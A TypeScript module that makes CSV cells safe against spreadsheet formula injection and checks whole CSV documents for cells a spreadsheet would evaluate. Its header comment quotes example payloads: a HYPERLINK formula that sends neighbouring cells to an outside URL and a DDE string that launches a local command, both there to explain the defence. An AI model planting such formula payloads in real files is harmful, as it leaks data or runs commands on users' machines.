// Spreadsheet-safe CSV cells (OWASP "CSV Injection", CWE-1236).
//
// RFC 4180 quoting keeps a value inside its own cell, but it does not stop
// Excel, LibreOffice or Google Sheets from evaluating a cell whose text starts a
// formula. A name such as `=HYPERLINK("https://…?d="&A2,"Open")` opens as a live
// link that sends neighbouring cells away when clicked, and legacy DDE can run a
// local command. So text that starts with `=`, `+`, `-`, `@`, TAB or CR is
// written with a leading `'`, which a spreadsheet opens as text. A CSV is a
// human-readable view: the exact value belongs in the JSON file beside it.
//
// Numbers are left alone, and a number is recognised by its whole text, never
// by its first character. A JavaScript number always renders as a decimal
// literal, and PostgreSQL `numeric`/`int8` columns arrive from a raw query as
// decimal strings (`-3.0000000000`) that must still open as the same number.
// `-2+3` or `-1+cmd|' /C calc'!A0` is not a decimal literal, so it is
// neutralized. `csvCell` and `isFormulaSafeCsv` share this one rule, so any
// document written with `csvCell` passes the check.

export type CsvCellValue = string | number | boolean | null | undefined

const FORMULA_TRIGGER = /^[=+\-@\t\r]/u
// `1`, `1.`, `1.5` or `.5`, then an optional exponent. The groups carry no
// quantifier of their own (an empty alternative makes the exponent optional),
// which keeps the pattern linear and within security/detect-unsafe-regex.
const DECIMAL_LITERAL = /^[+-]?(?:\d+\.\d*|\d+|\.\d+)(?:[eE][+-]?\d+|)$/u
const NEEDS_QUOTES = /[",\r\n]/u
const CELL_SEPARATORS: ReadonlySet<string> = new Set([',', '\n', '\r'])

/** Whether a spreadsheet would evaluate this cell text as a formula. */
function startsFormula(text: string): boolean {
  return FORMULA_TRIGGER.test(text) && !DECIMAL_LITERAL.test(text)
}

/**
 * One RFC 4180 cell. Formula-leading text gains a leading `'`; a cell holding a
 * quote, comma or line break is then quoted. null and undefined are empty.
 */
export function csvCell(value: CsvCellValue): string {
  if (value === null || value === undefined) return ''
  const rendered = String(value)
  const text = startsFormula(rendered) ? `'${rendered}` : rendered
  return NEEDS_QUOTES.test(text) ? `"${text.replaceAll('"', '""')}"` : text
}

type ScannedCell = Readonly<{ text: string; end: number }>

/** A quoted cell from its opening quote; null when the quote never closes. */
function scanQuotedCell(document: string, start: number): ScannedCell | null {
  const parts: string[] = []
  let index = start + 1
  for (;;) {
    const quote = document.indexOf('"', index)
    if (quote === -1) return null
    parts.push(document.slice(index, quote))
    if (document.charAt(quote + 1) !== '"') {
      return { text: parts.join('"'), end: quote + 1 }
    }
    index = quote + 2
  }
}

/** The cell starting at `start`; null when its quoting is malformed. */
function scanCell(document: string, start: number): ScannedCell | null {
  if (document.charAt(start) === '"') {
    const cell = scanQuotedCell(document, start)
    const endsCell =
      cell !== null &&
      (cell.end === document.length || CELL_SEPARATORS.has(document.charAt(cell.end)))
    return endsCell ? cell : null
  }
  let end = start
  while (end < document.length && !CELL_SEPARATORS.has(document.charAt(end))) {
    if (document.charAt(end) === '"') return null
    end += 1
  }
  return { text: document.slice(start, end), end }
}

/**
 * Whether a spreadsheet can open this RFC 4180 document without evaluating any
 * cell as a formula. Malformed quoting fails too, because readers would then
 * disagree about where a cell starts. A lone CR ends a line, as it does in a
 * spreadsheet.
 */
export function isFormulaSafeCsv(document: string): boolean {
  let start = 0
  while (start < document.length) {
    const cell = scanCell(document, start)
    if (cell === null || startsFormula(cell.text)) return false
    start = cell.end + (document.startsWith('\r\n', cell.end) ? 2 : 1)
  }
  return true
}
